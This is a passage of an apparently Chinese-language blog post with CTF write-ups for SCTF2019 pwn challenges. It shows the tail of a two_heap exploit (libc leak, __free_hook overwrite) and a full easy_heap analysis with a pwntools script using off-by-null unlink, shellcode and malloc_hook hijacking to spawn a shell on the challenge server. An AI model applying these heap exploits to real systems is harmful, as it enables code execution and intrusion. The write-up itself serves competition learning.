class="string">"Input the note:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">p.recvuntil(<span class="string">"Welcome to SCTF:"</span>)</span><br><span class="line">p.sendline(<span class="string">"%a"</span>*<span class="number">5</span>)</span><br><span class="line">p.recvuntil(<span class="string">"0x0p+00x0p+00x0.0"</span>)</span><br><span class="line">lib_addr = int(p.recvuntil(<span class="string">"p-10220x"</span>,drop=<span class="literal">True</span>)+<span class="string">"0"</span>,<span class="number">16</span>) - a.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">free_hook = a.symbols[<span class="string">"__free_hook"</span>]+lib_addr</span><br><span class="line">system = lib_addr+a.symbols[<span class="string">"system"</span>]</span><br><span class="line"><span class="keyword">print</span> hex(lib_addr)</span><br><span class="line">new0(<span class="number">0x1</span>,<span class="string">" "</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">raw_input()</span><br><span class="line">new0(<span class="number">0x8</span>,p64(free_hook))</span><br><span class="line">new0(<span class="number">0x10</span>,<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(<span class="number">24</span>,p64(system))</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">remove(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>这个题主要是在offbynull上，题目如果预期解是house of orange的话这个题就复杂了很多但是其实用unlink解就容易多了。</p>
+<h3 id="静态分析-2"><a href="#静态分析-2" class="headerlink" title="静态分析"></a>静态分析</h3><h4 id="main-2"><a href="#main-2" class="headerlink" title="main"></a>main</h4><p>主要实现了功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v3; // [rsp+14h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v4; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  v3 = 0;</span><br><span class="line">  sub_CD0();</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      _isoc99_scanf(&amp;unk_12A8, &amp;v3);</span><br><span class="line">      if ( v3 != 2 )</span><br><span class="line">        break;</span><br><span class="line">      del();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v3 &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v3 == 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        fill();</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v3 == 4 )</span><br><span class="line">          exit(0);</span><br><span class="line">LABEL_13:</span><br><span class="line">        puts(&quot;Invalid choice!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v3 != 1 )</span><br><span class="line">        goto LABEL_13;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="del-1"><a href="#del-1" class="headerlink" title="del"></a>del</h4><p>正常的一个删除函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int del()</span><br><span class="line">&#123;</span><br><span class="line">  void *v0; // rax</span><br><span class="line">  unsigned int v2; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Index: &quot;);</span><br><span class="line">  v2 = sub_EE5();</span><br><span class="line">  if ( v2 &lt;= 0xF &amp;&amp; qword_202060[2 * v2 + 1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free(qword_202060[2 * v2 + 1]);</span><br><span class="line">    qword_202060[2 * v2 + 1] = 0LL;</span><br><span class="line">    qword_202060[2 * v2] = 0LL;</span><br><span class="line">    v0 = &amp;unk_202040;</span><br><span class="line">    --unk_202040;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = puts(&quot;Invalid index.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return (signed int)v0;</span><br></pre></td></tr></table></figure>
+<h4 id="fill"><a href="#fill" class="headerlink" title="fill"></a>fill</h4><p>这里存在一个off by null的漏洞是可以利用的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int fill()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Index: &quot;);</span><br><span class="line">  v1 = sub_EE5();</span><br><span class="line">  if ( v1 &gt; 0xF || !qword_202060[2 * v1 + 1] )</span><br><span class="line">    return puts(&quot;Invalid index.&quot;);</span><br><span class="line">  printf(&quot;Content: &quot;);</span><br><span class="line">  return input((__int64)qword_202060[2 * v1 + 1], (unsigned __int64)qword_202060[2 * v1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h3><ol>
+<li>进行一个unlink控制全局变量，这题还有别的解法就是off by null来unlink或者largebin attack 去控制和写入mmap的内存</li>
+<li>写入mmap内存为shellcode然后利用fastbin attack 改写malloc_hook</li>
+</ol>
+<blockquote>
+<p>这里的方法细节是在bss段构造一个fakechunk然后free进入unsortedbin 会有libc地址残留在指针处，然后改指针的低位，就可以malloc到需要的地方，然后改malloc_hook为one就可以了。</p>
+</blockquote>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p = process("./easy_heap")#,env=&#123;"LD_PRELOAD":"./libc.so.6"&#125;)</span></span><br><span class="line">a = ELF(<span class="string">"./easy_heap"</span>)</span><br><span class="line">e = a.libc</span><br><span class="line"><span class="keyword">print</span> hex(e.symbols[<span class="string">"puts"</span>])</span><br><span class="line">p = remote(<span class="string">"132.232.100.67"</span>,<span class="number">10004</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)#,"b *0x5555555554a0")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">p.recvuntil(<span class="string">"Mmap: "</span>)</span><br><span class="line">mmap_addr = int(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(mmap_addr)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Address 0x"</span>)</span><br><span class="line">addr = int(p.recvline().strip(),<span class="number">16</span>) - <span class="number">0x202068</span></span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(addr+<span class="number">0x202068</span><span class="number">-0x18</span>)+p64(addr+<span class="number">0x202068</span><span class="number">-0x10</span>)+<span class="string">"a"</span>*<span class="number">0xd0</span>+p64(<span class="number">0xf0</span>))</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xf8</span>)+p64(addr+<span class="number">0x202078</span>)+p64(<span class="number">0x140</span>)+p64(mmap_addr))</span><br><span class="line">edit(<span class="number">1</span>,asm(shellcraft.sh()))</span><br><span class="line">bss_addr = <span class="number">0x202040</span></span><br><span class="line">edit(<span class="number">0</span>,p64(addr+<span class="number">0x202090</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)*<span class="number">17</span>+p64(<span class="number">0x21</span>)*<span class="number">5</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x100</span>)+<span class="string">'\x10'</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(mmap_addr))</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>题目感觉还是挺有质量的，就是怪自己手速太慢，没拿到几个血，我tcl，wsl。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf-pwn/" rel="tag"># -ctf-pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/20/关于路由和mips语句杂记/" rel="next" title="关于路由和mips语句杂记">
+                <i class="fa fa-chevron-left"></i> 关于路由和mips语句杂记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/27/强网杯线下Router-路由器漏洞挖掘/" rel="prev" title="强网杯线下Router-路由器漏洞挖掘">
+                强网杯线下Router-路由器漏洞挖掘 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80NDI3My8yMDgwNQ=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/touxiang.JPG" alt="peanuts">
+            
+              <p class="site-author-name" itemprop="name">peanuts</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">9</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SCTF2019pwn题解"><span class="nav-number">1.</span> <span class="nav-text">SCTF2019pwn题解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#one-heap"><span class="nav-number">1.1.</span> <span class="nav-text">one_heap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#静态分析"><span class="nav-number">1.1.1.</span> <span class="nav-text">静态分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#main"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">main</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#menu"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">menu</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#delete"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">delete</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#add"><span class="nav-number">1.1.1.4.</span> <span class="nav-text">add</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路分析"><span class="nav-number">1.1.2.</span> <span class="nav-text">思路分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.1.3.</span> <span class="nav-text">exp:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#two-heap"><span class="nav-number">1.2.</span> <span class="nav-text">two_heap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#静态分析-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">静态分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#main-1"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">main</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#add-1"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">add</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#del"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">del</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路分析-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">思路分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">exp:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-heap"><span class="nav-number">1.3.</span> <span class="nav-text">easy_heap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#静态分析-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">静态分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#main-2"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">main</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#del-1"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">del</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fill"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">fill</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路分析-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">思路分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-2"><span class="nav-number">1.3.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.4.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">peanuts</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.1</div>
+
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.1"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.1"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script>
+  window.livereOptions = {
+    refer: '2019/06/27/SCTF2019-PWN-WP/'
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
